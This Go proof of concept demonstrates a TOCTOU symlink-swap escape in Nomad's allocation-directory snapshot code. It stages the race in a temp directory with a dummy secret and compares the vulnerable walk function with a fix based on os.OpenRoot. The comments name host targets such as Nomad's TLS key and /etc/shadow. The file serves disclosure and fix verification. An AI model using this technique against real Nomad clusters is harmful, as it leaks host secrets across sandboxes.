// NomadHiccup — HashiCorp Nomad client allocdir snapshot TOCTOU symlink escape.
//
// hashicorp/nomad client/allocdir/alloc_dir.go `AllocDir.Snapshot` streams a
// running allocation's directory to another client as a tar archive (used for
// alloc migration / the alloc watcher). It walks the alloc dir with
// filepath.Walk and, for every entry that Lstat classified as a regular file,
// does `os.Open(path)` + `io.Copy` to archive its contents.
//
// `os.Open` FOLLOWS symlinks. `filepath.Walk` classifies each entry from a
// walk-time Lstat, so there is a TOCTOU window between "Walk saw a regular file"
// and "Snapshot opens it". A still-running malicious task that replaces one of
// its regular files with a symlink to a HOST path (e.g. Nomad's TLS key,
// /etc/shadow, or another allocation's secrets) in that window makes Snapshot
// archive the OUTSIDE-sandbox file's contents into the stream sent to another
// client — an allocation-sandbox escape / host file disclosure.
//
// Fixed (unreleased, commit 81504bce76, Oct 2026) by opening the walked tree
// through Go 1.24 `os.OpenRoot` and using `root.Open`, a path jail that refuses
// to traverse a symlink escaping the root, plus a re-stat rejecting non-regular
// files. Ref: github.com/hashicorp/nomad/issues/28605.
//
// This PoC ports the EXACT vulnerable and fixed walkFn bodies and drives them
// against a real staged filesystem, reproducing the won-race state (the entry
// is a regular file at Lstat time, a symlink by open time).
package main

import (
	"archive/tar"
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// ===== VULNERABLE: the regular-file branch of Nomad's Snapshot walkFn (verbatim). =====
// fileInfo is the walk-time Lstat result (regular file); `path` on disk may have
// since been swapped for a symlink by a racing task.
func vulnerableArchive(tw *tar.Writer, allocDir, path string, fileInfo os.FileInfo) error {
	relPath, err := filepath.Rel(allocDir, path)
	if err != nil {
		return err
	}
	link := ""
	if fileInfo.Mode()&os.ModeSymlink != 0 { // walk-time view: NOT a symlink
		target, err := os.Readlink(path)
		if err != nil {
			return fmt.Errorf("error reading symlink: %v", err)
		}
		link = target
	}
	hdr, err := tar.FileInfoHeader(fileInfo, link)
	if err != nil {
		return err
	}
	hdr.Name = relPath
	if err := tw.WriteHeader(hdr); err != nil {
		return err
	}
	if fileInfo.IsDir() || (fileInfo.Mode()&os.ModeSymlink != 0) {
		return nil
	}
	// Write the file into the archive — os.Open FOLLOWS the swapped-in symlink.
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.Copy(tw, file)
	return err
}

// ===== FIXED: open through os.OpenRoot (Go 1.24 path jail) + re-stat. =====
func fixedArchive(tw *tar.Writer, allocDir, rootDir, path string, fileInfo os.FileInfo) error {
	root, err := os.OpenRoot(rootDir)
	if err != nil {
		return err
	}
	defer root.Close()

	rel, err := filepath.Rel(rootDir, path)
	if err != nil {
		return err
	}
	if !fileInfo.Mode().IsRegular() {
		return nil
	}
	// root.Open refuses to traverse a symlink that escapes rootDir.
	file, err := root.Open(rel)
	if err != nil {
		return err
	}
	defer file.Close()
	openInfo, err := file.Stat()
	if err != nil {
		return err
	}
	if !openInfo.Mode().IsRegular() {
		return fmt.Errorf("%q changed type during snapshot", path)
	}
	hdr, _ := tar.FileInfoHeader(fileInfo, "")
	hdr.Name, _ = filepath.Rel(allocDir, path)
	if err := tw.WriteHeader(hdr); err != nil {
		return err
	}
	_, err = io.Copy(tw, file)
	return err
}

func tarContains(archive []byte, needle string) bool {
	tr := tar.NewReader(bytes.NewReader(archive))
	for {
		_, err := tr.Next()
		if err != nil {
			return false
		}
		var b bytes.Buffer
		io.Copy(&b, tr)
		if bytes.Contains(b.Bytes(), []byte(needle)) {
			return true
		}
	}
}

func main() {
	base, _ := os.MkdirTemp("", "nomadhiccup-*")
	defer os.RemoveAll(base)

	// Layout: an alloc sandbox, and a HOST secret that lives OUTSIDE it.
	allocDir := filepath.Join(base, "alloc", "abc123")
	sandbox := filepath.Join(allocDir, "alloc", "data") // the walked root (SharedDataDir)
	os.MkdirAll(sandbox, 0o755)
	const HOST_SECRET = "NOMAD-TLS-PRIVATE-KEY-EXAMPLE-not-a-real-key-xyz789"
	hostSecret := filepath.Join(base, "host", "nomad-agent.key")
	os.MkdirAll(filepath.Dir(hostSecret), 0o700)
	os.WriteFile(hostSecret, []byte(HOST_SECRET), 0o600)

	// The task's own regular file inside the sandbox (what Walk Lstats). The
	// attacker sizes it to at least the target length so the stale tar header
	// (built from this Lstat) can hold the whole leaked secret.
	victim := filepath.Join(sandbox, "output.log")
	os.WriteFile(victim, bytes.Repeat([]byte("A"), 4096), 0o644)

	fmt.Println("NomadHiccup — Nomad allocdir Snapshot TOCTOU symlink escape\n")
	fmt.Printf("[*] alloc sandbox : %s\n", sandbox)
	fmt.Printf("[*] host secret   : %s (outside the sandbox)\n\n", hostSecret)

	// Walk-time: Lstat sees a regular file.
	fileInfo, _ := os.Lstat(victim)
	fmt.Printf("[*] Walk sees %q as regular=%v\n", filepath.Base(victim), fileInfo.Mode().IsRegular())

	// TOCTOU: the still-running malicious task wins the race and replaces the
	// regular file with a symlink to the host secret before Snapshot opens it.
	os.Remove(victim)
	if err := os.Symlink(hostSecret, victim); err != nil {
		fmt.Println("symlink failed:", err)
		os.Exit(1)
	}
	fmt.Printf("[*] race won: %q is now a symlink -> %s\n\n", filepath.Base(victim), hostSecret)

	// ---- Vulnerable Snapshot ----
	var vbuf bytes.Buffer
	vtw := tar.NewWriter(&vbuf)
	if err := vulnerableArchive(vtw, allocDir, victim, fileInfo); err != nil {
		fmt.Println("[*] vulnerable archive error:", err)
	}
	vtw.Close()
	if tarContains(vbuf.Bytes(), HOST_SECRET) {
		fmt.Println("[+] ESCAPE CONFIRMED: the snapshot archive contains the HOST secret")
		fmt.Printf("[+]   leaked: %q\n", HOST_SECRET)
	} else {
		fmt.Println("[-] no leak (unexpected)")
		os.Exit(1)
	}

	// ---- Fixed Snapshot (os.OpenRoot) ----
	var fbuf bytes.Buffer
	ftw := tar.NewWriter(&fbuf)
	err := fixedArchive(ftw, allocDir, sandbox, victim, fileInfo)
	ftw.Close()
	if tarContains(fbuf.Bytes(), HOST_SECRET) {
		fmt.Println("\n[-] FAIL: fixed path still leaked the host secret")
		os.Exit(1)
	}
	fmt.Printf("\n[+] Control OK: fixed os.OpenRoot path refused the escaping symlink (err: %v); no leak.\n", err)
	fmt.Println("\n[+] CONFIRMED: TOCTOU symlink swap -> host/cross-sandbox file exfiltrated via alloc migration.")
}
